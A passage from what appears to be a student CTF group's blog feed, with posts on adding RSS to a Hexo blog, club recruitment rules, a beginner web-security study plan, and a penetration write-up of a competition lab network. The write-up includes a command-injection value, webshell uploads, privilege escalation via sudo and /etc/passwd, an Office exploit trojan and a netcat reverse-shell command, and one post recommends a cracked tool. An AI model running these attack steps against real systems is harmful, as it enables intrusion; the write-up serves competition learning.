enable: true #是否启用插件</span><br><span class="line">  type: atom #有atom和rss2两个选项，使用默认atom就好了</span><br><span class="line">  path: atom.xml #也用默认配置atom.xml就行</span><br><span class="line">  limit: 20 #展示文章的数量,使用 0 或 false 代表展示全部</span><br><span class="line">  hub: #这个我没用上，根据官网，空着就行</span><br><span class="line">  content: #默认是false，true的话会在rss文件中包含整个文章内容</span><br><span class="line">  content_limit: 140 #摘要长度</span><br><span class="line">  content_limit_delim: &#x27; &#x27; #没看明白官方的意思，就跟着默认不填了</span><br><span class="line">  order_by: -date #采用日期进行排序</span><br><span class="line">  icon: icon.png #给rss链接配置icon</span><br><span class="line">  autodiscovery: true #自动发现提要</span><br><span class="line">  template: #给rss文章配置模板</span><br></pre></td></tr></table></figure><p>然后打开主题的config.yml，由于我这里是butterfly，所以在 config.butterfly.yml里添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rss: atom.xml</span><br></pre></td></tr></table></figure><p>然后再在config.butterfly.yml里找到social settings，添加图标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fas fa-rss: https://你的域名地址/atom.xml</span><br></pre></td></tr></table></figure><p>如果是butterfly，那么还可能出现既有按钮又有图标的情况</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814083040130.png" alt="image-20240814083040130"></p><p>按钮可以在config.butterfly.yml中</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814083223764.png" alt="image-20240814083223764"></p><p>将true改成false即可</p><h2 id="2-RssEverything"><a href="#2-RssEverything" class="headerlink" title="2.RssEverything"></a>2.RssEverything</h2><p>本来有一个 feed43，但是 feed43 倒闭了，现在 RssEverything 是它的平替，可以对任意网站创建rss 源，而且算是简单快捷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rsseverything.com/zh/newfeed</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814102353761.png" alt="image-20240814102353761"></p><p>首先输入域名，能获取到对应的网页代码</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814102445173.png" alt="image-20240814102445173"></p><p>点开全局搜索模式</p><p>在下面填写对应的匹配词，点击提取会出现提取的项目，只需要提取出对应的标题，链接，文章大概就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编写规则是，需要的内容就用&#123;%&#125;包裹起来，不需要的内容就用&#123;*&#125;屏蔽，直接写上去的，比如&lt; div class=&quot;content&quot;&gt; 就代表必须要匹配到这个格式，很好理解吧</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814103815706.png" alt="image-20240814103815706"></p><p>然后再在下面填写先前提取的参数和一些内容，点击预览就能查看到是否是需要的效果，下面会出现相对应的rss链接，进行使用即可</p><p><img src="/../image/%E6%B7%BB%E5%8A%A0rss%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/image-20240814103922816.png" alt="image-20240814103922816"></p><p>如果还是不会做的话，可以跟着视频一步一步做</p><p><a href="https://www.bilibili.com/video/BV1bY411w7rH/?vd_source=7fc24f98912befbf420feef97e387e4b">https://www.bilibili.com/video/BV1bY411w7rH/?vd_source=7fc24f98912befbf420feef97e387e4b</a></p><p>虽然是使用的 feed43，但是规则差不多</p><p>这种的好处是不需要拥有网站也能上自定义 Rss 订阅，缺点是和  RssEverything高度绑定，如果RssEverything 寄了，那么链接也会失效</p><h2 id="3-RSSHub"><a href="#3-RSSHub" class="headerlink" title="3.RSSHub"></a>3.RSSHub</h2><p>很多人推荐使用这种方式，因为 RSSHub 是一个开源项目，你可以自己 DIY 一个 RSS 仓库，而且不会因为服务方挂掉而挂掉，比如 feed43。但是缺点是有点麻烦，需要自己写代码，造轮子。</p><p>由于笔者尝试了，但没有成功，所以这里只对创建RSSHub项目提供一些建议</p><p>首先是官方文档，启动必备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rsshub-doc.pages.dev/joinus/new-rss/before-start.html#an-zhuang-yi-lai</span><br></pre></td></tr></table></figure><p>其次是大佬文档，作为参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://maronyea.me/restless/72/</span><br></pre></td></tr></table></figure><p>最后祝愿你能创建成功！🥹</p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考核须知</title>
      <link href="/posts/0a3e0b83a0aa/"/>
      <url>/posts/0a3e0b83a0aa/</url>
      
        <content type="html"><![CDATA[<h4 id="i-考核的实质："><a href="#i-考核的实质：" class="headerlink" title="i. 考核的实质："></a>i. 考核的实质：</h4><p>考察同学们的自学能力、搜索信息的能力，即使是零基础，也不要气馁，我们会从每周提交的 WriteUp 中看到你的进步与努力！即使最后没有通过，相信你也会从中收获到网络安全意识的提高，自学能力的提升，搜索信息能力的增强！</p><h4 id="ii-考核期间："><a href="#ii-考核期间：" class="headerlink" title="ii. 考核期间："></a>ii. 考核期间：</h4><ol><li>可自由使用百度，GPT 等工具做题，也可在群内自由交流做题心得，也可以对着大佬写的答案（ WriteUp ）边看边做，但是必须是自己动手做出来的题目。因为CTF绝大多数比赛的比赛期间，都是允许选手可以上网边搜索边学，再做出题目。</li><li>合理安排自己的学习时间，并且不管在 DDL 前有无写完题目，都可以交 WP，如果你是0基础小白，也不必担心，只要有一颗热爱网络安全的心，认真学习，WP 中详略得当，有自己独立的思考也是可以通过的，<del>最终解释权归招新人员所有</del>；</li><li>考核内容有限，不用拘泥于等待考核内容发布，按照自己的学习进度往后学，相信你一定会学有所得！</li></ol><h4 id="iii-考核难点："><a href="#iii-考核难点：" class="headerlink" title="iii. 考核难点："></a>iii. 考核难点：</h4><p>考核期间需要安装许多工具，例如 HackBar，BurpSuite（web神器，新手安装起来较为复杂），VMware，IDA（逆向分享工具），Stegsolve（图片隐写解析），御剑（扫描网页后台目录，建议去下破解版），蚁剑（连接后台），还需要利用一系列在线工具，若遇到问题，最好先独立解决，去网上搜安装教程，不断尝试，不过这会耗费你大量时间，如果实在遇到实在无法解决的一些配置问题可以在群里提出（一般网上都有教程(っ °Д °;)っ）；</p><h4 id="iv-关于我们："><a href="#iv-关于我们：" class="headerlink" title="iv. 关于我们："></a>iv. 关于我们：</h4><p>网络空间安全竞赛基地与数计学院 CTF 部本质并非社团，而是技术组织。<strong>网络空间安全竞赛基地</strong>属于网络空间安全学院直属基地，位于青山湖校区，数计学院 CTF 部是网络空间安全竞赛基地的重要合作组织，位于前湖校区，日常成员们会在网络上一起交流技术，学习经验，开展培训。并且基地内有一支今年全校唯一一支打入“长城杯铁人三项赛国赛”决赛的队伍，也是半决赛一等奖。目前由于学校规定，只能有一个社团存在，由于申请时间上的原因，我们将不会衍生社团部门。如果只是对社团感兴趣的同学，想体验社团生活，那建议去烽火。<strong>数计学院 CTF 部</strong>则由指导老师、研究生和本科生共同组成。并且今年有一支队伍为 NCU 打进2024 CISCN 分区赛，夺得荣誉，也有获得复兴杯大学生网络安全精英赛一等奖的选手，蓝桥杯网络安全CTF赛道获奖选手等等，欢迎大家的加入！</p><h4 id="v-考核流程："><a href="#v-考核流程：" class="headerlink" title="v.考核流程："></a>v.考核流程：</h4><p>详见考核流程图。并且以考核流程图为准。</p><p><img src="/../image/%E8%80%83%E6%A0%B8%E9%A1%BB%E7%9F%A5/1%20(2).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络空间安全竞赛基地以及数计CTF部入门</title>
      <link href="/posts/dfad4d07a28f/"/>
      <url>/posts/dfad4d07a28f/</url>
      
        <content type="html"><![CDATA[<p>你好亲爱的学弟学妹：</p><p>​欢迎来到网络空间安全竞赛基地以及 CTF 部，下面我们来介绍一下入门的事情。相信在前面的时候你们遭受过了很多关于看不懂群里在聊什么的困扰。那么我在这里详细介绍一下该怎么学习，怎么入门。</p><p>​首先网络空间安全竞赛基地的主责是对自己进行技术的提升，包括但不限于参加竞赛，参加企业培训，考证，参加实际项目，以及最重要的自己专研与相互交流学习。</p><p>提前声明：这些方面和学校平常上课以及培养方案算是过于超前了。你需要平衡好学习与竞赛。当然也可以选择和老登一样不管学习，直接面向就业(也能获得不错的岗位)</p><h1 id="入门："><a href="#入门：" class="headerlink" title="入门："></a>入门：</h1><p>首先需要学习的基本内容：</p><h3 id="1-如何擅用网络，包括搜索，提问，魔法梯子，论坛"><a href="#1-如何擅用网络，包括搜索，提问，魔法梯子，论坛" class="headerlink" title="1.如何擅用网络，包括搜索，提问，魔法梯子，论坛"></a>1.如何擅用网络，包括搜索，提问，魔法梯子，论坛</h3><p>搜索：使用 Google，不会可以问 Copilot ，由于 Copilot 是联网的，所以你能通过它翻到一些资料，进资料里面查看，注意辨别内容真伪。</p><p>向他人提问：<a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/">https://lug.ustc.edu.cn/wiki/doc/smart-questions/</a></p><p>梯子：找人进行领取</p><p>论坛：包括但不限于<a href="https://bbs.kanxue.com/">https://bbs.kanxue.com/</a></p><h3 id="2-如何学习竞赛内容"><a href="#2-如何学习竞赛内容" class="headerlink" title="2.如何学习竞赛内容"></a>2.如何学习竞赛内容</h3><p>好的，当你看到这里的时候，如果你是想加入我们并且现在在群里面，那么后面几条你可以先不看或者选看。你现在的目标是完成考核</p><p>首先你需要去看<a href="https://hello-ctf.com/HC_Start/">https://hello-CTF.com/HC_Start/</a></p><p>了解 CTF 大概是干什么的,其次看下面对应方向使用的工具，进行尝试安装，在安装方面无论有什么问题，都可以问！就是怕你不问，不过在问之前，建议自己先动手实操一遍。</p><p>简单的描述在 Hello-CTF，CTFWiki 等都有介绍，具体体验如何需要自行刷题验证</p><p>Web ：范围广，无论是知识要求还是就业或是折磨，好玩</p><p>Crypto：算法，对加解密要求会多一些，写解密算法</p><p>Reverse：研究操作系统底层架构，反向还原程序执行逻辑</p><p>Pwn：深入，非常深入的一门学问，通过栈溢出等手段攻破服务，操控电脑</p><p>Misc：好玩。轻松愉快得入门，泥牛入海的进步，但对就业当安全运营看流量有帮助的。</p><p>然后是漫长的刷题，BuuCTF、NssCTF、Bugku、攻防世界、CTFshow、CTFhub、EDISEC 等等</p><p>目前招新阶段推荐是CTF各个方向都去了解，知道其是干什么的。后面的学习我们是会根据各位来选择某一方面或者几方面进行深入学习</p><p><strong>在初学的时候，不会做题很正常，主要是讲题目思路的积累为主。</strong></p><h3 id="3-安全意识"><a href="#3-安全意识" class="headerlink" title="3.安全意识"></a>3.安全意识</h3><p>不希望有人仍然使用生日号码当密码，参考<a href="https://evilcos.me/yinsi.html">https://evilcos.me/yinsi.html</a></p><p>新时代的安全需更甚</p><h3 id="4-学会使用-Markdown-格式书写"><a href="#4-学会使用-Markdown-格式书写" class="headerlink" title="4.学会使用 Markdown 格式书写"></a>4.学会使用 Markdown 格式书写</h3><p>使用 Typora 练习，或者其他支持 Markdown 语法的文档工具，比如语雀、飞书</p><h3 id="5-使用-Linux-机器，如-Kali、Ubuntu，安装-VMware-然后装-Kali-的虚拟机"><a href="#5-使用-Linux-机器，如-Kali、Ubuntu，安装-VMware-然后装-Kali-的虚拟机" class="headerlink" title="5.使用 Linux 机器，如  Kali、Ubuntu，安装 VMware 然后装 Kali 的虚拟机"></a>5.使用 Linux 机器，如  Kali、Ubuntu，安装 VMware 然后装 Kali 的虚拟机</h3><p>学习使用 Linux，在网上下载 VMware 、安装 Kali ，具体安装步骤网上都有，练习基本的 Linux 命令</p><h3 id="6-使用浏览器插件"><a href="#6-使用浏览器插件" class="headerlink" title="6.使用浏览器插件"></a>6.使用浏览器插件</h3><p>比如 HackBar 、沉浸式翻译、 SwitchOmega</p><h3 id="7-了解从输入-URL-到页面加载完成过程中都发生了什么事情，网页编码"><a href="#7-了解从输入-URL-到页面加载完成过程中都发生了什么事情，网页编码" class="headerlink" title="7.了解从输入 URL 到页面加载完成过程中都发生了什么事情，网页编码"></a>7.了解从输入 URL 到页面加载完成过程中都发生了什么事情，网页编码</h3><p><a href="https://blog.csdn.net/qq_43650490/article/details/119463103">https://blog.csdn.net/qq_43650490/article/details/119463103</a></p><p><a href="https://www.qianxingzhem.com/post-1499.html">https://www.qianxingzhem.com/post-1499.html</a></p><h3 id="8-熟悉网络配置并知道网络问题如何解决，Windows-Linux环境下动态IP获取与静态IP配置，DNS配置"><a href="#8-熟悉网络配置并知道网络问题如何解决，Windows-Linux环境下动态IP获取与静态IP配置，DNS配置" class="headerlink" title="8.熟悉网络配置并知道网络问题如何解决，Windows&#x2F;Linux环境下动态IP获取与静态IP配置，DNS配置"></a>8.熟悉网络配置并知道网络问题如何解决，Windows&#x2F;Linux环境下动态IP获取与静态IP配置，DNS配置</h3><p>安装完 Kalli 之后可以尝试练习</p><h3 id="9-学会更合理地安排时间和任务"><a href="#9-学会更合理地安排时间和任务" class="headerlink" title="9.学会更合理地安排时间和任务"></a>9.学会更合理地安排时间和任务</h3><h3 id="10-创建-GitHub-账号、创建自己的博客"><a href="#10-创建-GitHub-账号、创建自己的博客" class="headerlink" title="10.创建 GitHub 账号、创建自己的博客"></a>10.创建 GitHub 账号、创建自己的博客</h3><p>通过梯子创建 GitHub 账号，通过 Hexo 、Butterfly 组合搭建个人博客，托管到GitHub平台上</p><h3 id="11-一定一定创建自己的知识库"><a href="#11-一定一定创建自己的知识库" class="headerlink" title="11.一定一定创建自己的知识库"></a>11.一定一定创建自己的知识库</h3><p> 一定一定要</p><p>以上皆为入门建议，作为学习参考</p><p>另外我本想放在考核须知里的东西</p><p>加入我们的功利性好处: CTF 比赛拿的奖一样可以申请到第二课堂学分，综素分等等。甚至可以加入别的安全团队发起的联合战队，与全国各地的 CTFers 交流，与真正高手们一起学习。同时帮老师一起处理问题，混混眼熟，加加分。磨练自己技术上的同时，对保研以及就业都有好处，以及优秀学长在企业或者学院的资源。这些不是单从学校就可以获取的东西，也不是凭空出现的。都是我们前面的学长一代一代努力争取来的，期待你的到来( •̀ ω •́ )✧。(虽然功利地学不好，但还是放出来吸引更多的人吧)::&gt;_&lt;::</p><h2 id="附加数计CTF部郭少东学长的web速学指南"><a href="#附加数计CTF部郭少东学长的web速学指南" class="headerlink" title="附加数计CTF部郭少东学长的web速学指南"></a>附加数计CTF部郭少东学长的web速学指南</h2><h3 id="15天web速学指南"><a href="#15天web速学指南" class="headerlink" title="15天web速学指南"></a>15天web速学指南</h3><p>[TOC]</p><h2 id="1-5天：以最快的速度了解多门语言"><a href="#1-5天：以最快的速度了解多门语言" class="headerlink" title="1-5天：以最快的速度了解多门语言"></a>1-5天：以最快的速度了解多门语言</h2><h3 id="第一天："><a href="#第一天：" class="headerlink" title="第一天："></a>第一天：</h3><p>通过 W3School 以最快速度入门 HTML ，CSS 和 Javascript 语言。</p><p><a href="http://www.w3school.com.cn/">学习地址</a></p><p>建议：在本地写同样的代码并查看结果是否和教程的结果相同。</p><h3 id="第二-四天："><a href="#第二-四天：" class="headerlink" title="第二~四天："></a>第二~四天：</h3><p>下载并安装 PhpStudy。</p><p>通过 W3School 以最快速度入门 PHP ，并在本地复现每一个教程中的代码，强调：不要复制网页中的代码，要自己手打。如果出现的结果和网页中的结果相同，则继续学习。</p><p><a href="http://www.w3school.com.cn/php/index.asp">继续学习</a></p><p>如果有些语句无法理解其含义，那就无脑抄一遍并执行，看到结果即可。请自行安排学习时间，调整学习效率，以至于在第四天的时候可以将 PW3School PHP 部分的“PHP数据库”学习完。</p><h3 id="第五天："><a href="#第五天：" class="headerlink" title="第五天："></a>第五天：</h3><p>通过 W3School 学习 SQL 语言，了解 select&#x2F;insert&#x2F;update&#x2F;delete ，以及 union select 的语法。</p><p>本地执行SQL语言的方法如下：</p><p>1.PhpStudy 开启，保证 MySQL 是开启状态。</p><p>2.进入 PhpStudy 安装目录 &#x2F;MySQL&#x2F;bin</p><p>3.在此处打开命令与提示符，或在其他地方打开 cd 到此处，输入mysql.exe -u root -proot，回车</p><p>4.输入 create database tuzishifuzhuishuaile; （注意句末有分号）并回车</p><p>5.输入 use tuzishifuzhuishuaile;  并回车</p><p>6-7天：SQL注入学习</p><h3 id="第六天："><a href="#第六天：" class="headerlink" title="第六天："></a>第六天：</h3><p>既然学会了 SQL语句，那就动手做一下 SQL注入 题目吧！但是做之前，除了知道 PHP 和 SQL语言以外，还需要知道 SQL注入是什么，怎么注入。</p><h3 id="第七天："><a href="#第七天：" class="headerlink" title="第七天："></a>第七天：</h3><p>我猜你可能会用一整天时间看SQL注入的视频教程，虽然短，但是你需要在本地自己操作一下。我觉得一天还是需要的。如果你可以在几个小时内搞定，那你肯定没有完全吸收。除非你是个学霸XD。</p><p>8天：各种工具的使用</p><h3 id="第八天："><a href="#第八天：" class="headerlink" title="第八天："></a>第八天：</h3><p>之后就需要一些工具啦，我这里推荐一些工具供你学习：</p><ol><li><p>Python：请安装好。并将python加入到环境变量中，以至于在随处打开命令与提示符窗口输入python 都可以打开 Python，方法自行百度。</p></li><li><p>HackBar：这是一个 Firefox 浏览器的插件，对于修改 GET 和 POST 请求，用这个插件非常的方便，而且这个插件可以解码一些编码，比如 URL 编码， Base64 编码。（如果你并不知道上面提到的名词是什么，请百度学习一下）</p></li><li><p>BurpSuite：这是在做 Web 题目最最常用到的工具，工具的详细使用说明可以</p><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter3.html">点击查看</a></p></li></ol><p>为了做 Web 题目，只需要学习到第三章“数据拦截与控制”就可以了。</p><h3 id="9天：学习各种概念"><a href="#9天：学习各种概念" class="headerlink" title="9天：学习各种概念"></a>9天：学习各种概念</h3><p>第九天到了为什么还没有开始继续做题呢？是因为还有一些概念不懂就没法做题。</p><p>那么下面给出一个你需要了解的概念的列表，你需要自己去百度查询到底这些是什么，这样下次别人滔滔不绝的时候起码能听懂他在说什么。如果你有精力，最好可以深入的学习一些这些东西，并自己实践一下。</p><p>1.URL 编码</p><p>2.HTML 编码</p><p>3.Base64 编码</p><p>4.数据包</p><p>5.HTTP 响应头，都有哪些，都是做什么的</p><p>6.GET 传参，POST 传参，怎么传参</p><p>7.HTTP 协议是什么</p><p>8.MD5 是什么</p><p>9.GitHub</p><p>10.WriteUp</p><p>11.WebShell</p><p>——以上是非安全概念，下面是安全概念—–</p><p>12.信息泄露&#x2F;源码泄露</p><p>13.暴力破解</p><p>14.SQL 注入</p><p>15.XSS</p><p>16.CSRF</p><p>17.远程命令执行</p><p>18.代码执行</p><p>19.文件包含</p><p>20.任意文件上传&#x2F;下载&#x2F;删除</p><p>21.逻辑漏洞</p><p> ——如果你心有余力，还可以了解一下下面的概念——</p><ol start="22"><li>XXE</li></ol><p>23.SSRF</p><p>24.序列化漏洞&#x2F;反序列化漏洞</p><p>25.变量覆盖</p><p>26.DDOS</p><p>27.CRLF</p><p>28.DNS协议</p><p>29.Apache&#x2F;IIS&#x2F;Tomcat&#x2F;Nginx</p><p>是不是很吓人！这么长！别担心，这些都是一些概念，只需要你知道这是啥东西就可以了，而且从11下面的内容，即使你并不了解也没关系，因为后面也会学习到。</p><h3 id="10-15-天：各种web安全漏洞"><a href="#10-15-天：各种web安全漏洞" class="headerlink" title="10-15 天：各种web安全漏洞"></a>10-15 天：各种web安全漏洞</h3><p>第10-15天</p><p>你终于弄明白了一大堆概念究竟是什么，现在终于可以开始学习安全漏洞，利用了！那么10到15天就是学习这些知识的时候了。</p><p>提示：所有的漏洞请务必在本地复现</p><p>1.SQL注入漏洞：sql-lab</p><p>2.文件包含：</p><p><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html">点击此处</a></p><p>3.逻辑漏洞：php 是弱语言，要注意常见的用于判断的函数：</p><p><a href="http://www.blueshoes.org/en/developer/php_cheat_sheet">判断函数</a></p><p>4.变量覆盖与代码执行</p><p>暂无</p><p>5.代码审计：PHP-Audit-Labs</p><p>6.xss漏洞：xss-lab</p><p>7.csrf：</p><p><a href="http://wooyun.jozxing.cc/static/drops/web-15556.html">点击学习</a></p><p>好吧，我承认上面可能要求太高了，五天大概率做不完。但如果你真的这么坚持下去了，相信我，你在新选手中肯定是TOP3</p><hr><p><del>从此踏上CTF的不归路</del></p><blockquote><p>郭少东</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 基地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次渗透题目回顾</title>
      <link href="/posts/b14b406e218d/"/>
      <url>/posts/b14b406e218d/</url>
      
        <content type="html"><![CDATA[<p>首先这次是第一届长城杯决赛的企业环境题目回顾，内容写的比较简单，还请大佬不要拷打我::&gt;_&lt;::。由于我并没有存相关图片，这里展示的图片都将是借用别人的图片</p><h1 id="开打！"><a href="#开打！" class="headerlink" title="开打！"></a>开打！</h1><h2 id="第一层环境"><a href="#第一层环境" class="headerlink" title="第一层环境"></a>第一层环境</h2><p>由题目环境得知现在又三个靶机，分别是</p><p>202.0.2.29</p><p>202.0.2.30</p><p>202.0.2.32</p><h3 id="第一台机子"><a href="#第一台机子" class="headerlink" title="第一台机子"></a>第一台机子</h3><p>首先使用nmap对ip进行扫描，</p><p><img src="/posts/b14b406e218d/image-20240811170831217.png" alt="image-20240811170831217"></p><p>发现开了80，22，8080端口，首先我们可以去看它的web服务，发现是</p><p><img src="/posts/b14b406e218d/image-20240811170934738.png" alt="image-20240811170934738"></p><p>此外就没有什么发现了，这时候我们就可以去考虑目录扫描</p><p><img src="/posts/b14b406e218d/image-20240811171025117.png" alt="image-20240811171025117"></p><p>你会发现有一个uploads，这个时候就需要警觉，可能这个就是漏洞点，虽然后面的状态码显示的是301，但是不妨碍我们查看一下</p><p><img src="/posts/b14b406e218d/image-20240811171406751.png" alt="image-20240811171406751"></p><p>发现上传点，上传木马即可</p><p><img src="/posts/b14b406e218d/image-20240811173154656.png" alt="image-20240811173154656"></p><p><img src="/posts/b14b406e218d/image-20240811173216411.png" alt="image-20240811173216411"></p><p>通过翻找文件找到flag</p><p>但是发现有一个flag文件没有权限访问，同时还有一个文件叫做password-reminder.txt</p><p><img src="/posts/b14b406e218d/image-20240811173453203.png" alt="image-20240811173453203"></p><p><img src="/posts/b14b406e218d/image-20240811173505565.png" alt="image-20240811173505565"></p><p>猜测为ssh密码，因为上面开了ssh服务，此时我们就通过爆破手段，无论是写脚本，或者是使用超级弱口令检查工具或者是九头蛇爆破，最后使用密码登录到靶机上。</p><p>现在的权限基本够了，但还不是root，进入home目录能看到一个生成cookie的脚本</p><p><img src="/posts/b14b406e218d/image-20240811173820107.png" alt="image-20240811173820107"></p><p><img src="/posts/b14b406e218d/image-20240811174109978.png" alt="image-20240811174109978"></p><p>但是存在安全问题，因为使用sudo -l 查看权限会发现python是root权限，而且这个python脚本有命令执行漏洞，那么我们可以通过sudo python 此脚本来进行执行root命令进行提权</p><p>可以通过root权限增加root权限用户，再用这个用户进行ssh连接，这样我们就不用每次都使用这个python脚本执行命令了</p><p>一般到提权为root就没有东西了，你可以选择通过内网穿透，然后再查看此机器的内网是不是还有其他机器，或者查看此机器的路由 route -n或netstat -a，没有东西就可以撤了</p><p>但其实这个机器是能翻到还有一个内网环境的，此时我们已经有了root权限，而且木马也连上了，那么我们可以考虑使用venom或者proxychains进行内网穿透。</p><p>穿透好后，我们通过提示，有人曾在另一个内网使用ssh访问过这台机子，那么我们可以查看ssh的auth.log文件，会发现有其他网段的访问记录，<del>这里我没存到图片</del></p><p>根据提示的auth.log中翻到的ip地址，设置msf的代理环境，我记得是172.25.0.xxx，这里设置172.25.0.0&#x2F;24就行</p><p>如果是在windows上使用venom则不需要</p><p>扫描能得到三台内网机子</p><p><img src="/posts/b14b406e218d/image-20240811180700320.png" alt="image-20240811180700320"></p><h4 id="第一台机子的第二层环境"><a href="#第一台机子的第二层环境" class="headerlink" title="第一台机子的第二层环境"></a>第一台机子的第二层环境</h4><p>172.25.0.2 ，172.25.0.7 ，172.25.0.100</p><h4 id="内网一，机一"><a href="#内网一，机一" class="headerlink" title="内网一，机一"></a>内网一，机一</h4><p>访问即可</p><p><img src="/posts/b14b406e218d/image-20240811183206785.png" alt="image-20240811183206785"></p><p>配合bp进行抓包，通过yt_url修改命令进行命令执行</p><p>yt_url&#x3D;ll|ls${IFS}-al</p><p>同时发现能使用wget命令下载到本地的第一层靶机的文件，那么就可以通过这个下载我们的木马，访问即可</p><p><img src="/posts/b14b406e218d/image-20240811183557305.png" alt="image-20240811183557305"></p><p>但是很明显能看到权限不够，那么我们可以查看进程和进程权限</p><p>上 pspy 检测进程 <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p><p>看到root执行了clean.sh，并且www-data用户对该文件有读写权力</p><p><img src="/posts/b14b406e218d/image-20240811183753491.png" alt="image-20240811183753491"></p><p><img src="/posts/b14b406e218d/image-20240811183809740.png" alt="image-20240811183809740"></p><p>然后进行访问<img src="/posts/b14b406e218d/image-20240811184614764.png" alt="image-20240811184614764"></p><p>查看系统环境信息</p><p><img src="/posts/b14b406e218d/image-20240811184639739.png" alt="image-20240811184639739"></p><p>能知道账号密码，听说直接进入数据库能查看到flag</p><p>同时，能发现其下面还有内网，第二层内网</p><h5 id="内网二"><a href="#内网二" class="headerlink" title="内网二"></a>内网二</h5><p>有192.168.100.241和192.168.200.116</p><p>通过相同的代理手段，进入172的内网，然后访问下面的192.168.100.241</p><h6 id="内网二，机一"><a href="#内网二，机一" class="headerlink" title="内网二，机一"></a>内网二，机一</h6><p>图没存到，不写</p><h6 id="内网二，机二"><a href="#内网二，机二" class="headerlink" title="内网二，机二"></a>内网二，机二</h6><p>访问第二个内网二的机器</p><p>图没存到，不写</p><h4 id="内网一，机三"><a href="#内网一，机三" class="headerlink" title="内网一，机三"></a>内网一，机三</h4><p>能发现一个新的samba服务，ip地址为172.25.0.100</p><p><img src="/posts/b14b406e218d/image-20240811190410518.png" alt="image-20240811190410518"></p><p><img src="/posts/b14b406e218d/image-20240811190420136.png" alt="image-20240811190420136"></p><p>使用samba历史漏洞打</p><p><img src="/posts/b14b406e218d/image-20240811190501869.png" alt="image-20240811190501869"></p><p><img src="/posts/b14b406e218d/image-20240811190518361.png" alt="image-20240811190518361"></p><p>查找内网能查到192.168.1.2</p><h6 id="机三内网二"><a href="#机三内网二" class="headerlink" title="机三内网二"></a>机三内网二</h6><p><img src="/posts/b14b406e218d/image-20240811190701089.png" alt="image-20240811190701089"></p><p>使用office的cve-2017-11882漏洞</p><p><img src="/posts/b14b406e218d/image-20240811190747515.png" alt="image-20240811190747515"></p><p>生成doc文件木马进行上传，赛方说后台模拟了一个机器人进行点击，我们上传木马，机器人会自动点击doc文件木马，我们就可以进行访问了</p><p><img src="/posts/b14b406e218d/image-20240811190931592.png" alt="image-20240811190931592"></p><p>到达此处后，访问文件依旧会发现权限不够，需要system权限</p><p>我们通过ms15-077漏洞提权到system，再去读flag</p><p>使用nc 192.168.3.34 1234 -e cmd尝试弹回shell</p><p>然后去磁盘里翻flag即可</p><h3 id="机二"><a href="#机二" class="headerlink" title="机二"></a>机二</h3><p>接下来是第二个机器</p><p>首先也是进行扫描</p><p><img src="/posts/b14b406e218d/image-20240811175025721.png" alt="image-20240811175025721"></p><p>发现ssh、web、mysql服务</p><p>猜测也是要提权的</p><p>首先也先访问80的web服务</p><p><img src="/posts/b14b406e218d/image-20240811175128792.png" alt="image-20240811175128792"></p><p>有上传点，直接无脑上传，其次有文件，打开文件并进行拖拽能看到flag</p><p><img src="/posts/b14b406e218d/image-20240811175212675.png" alt="image-20240811175212675"></p><p>使用蚁剑连接即可，翻找flag文件</p><p>然后猜测提权，查看到&#x2F;etc&#x2F;passwd文件有写入权限</p><p>我们直接写入root权限账号，然后连接即可，会在root目录下发现几个flag</p><p>提权后，再查看其内网，发现没有机器存活，那么可以退出下一个了</p><p>第三台机器</p><p>也是进行扫描</p><p><img src="/posts/b14b406e218d/image-20240811175512214.png" alt="image-20240811175512214"></p><p>发现没有开80端口</p><p>访问其8899端口会发现一个程序，这里是需要通过pwn来解决这个问题</p><p><img src="/posts/b14b406e218d/image-20240811175620696.png" alt="image-20240811175620696"></p><p>部分图片来自fffffilm师傅</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对Live2DViewerEX生成可用mono-2.0-bdwgc.dll的尝试</title>
      <link href="/posts/4748fe5d0a70/"/>
      <url>/posts/4748fe5d0a70/</url>
      
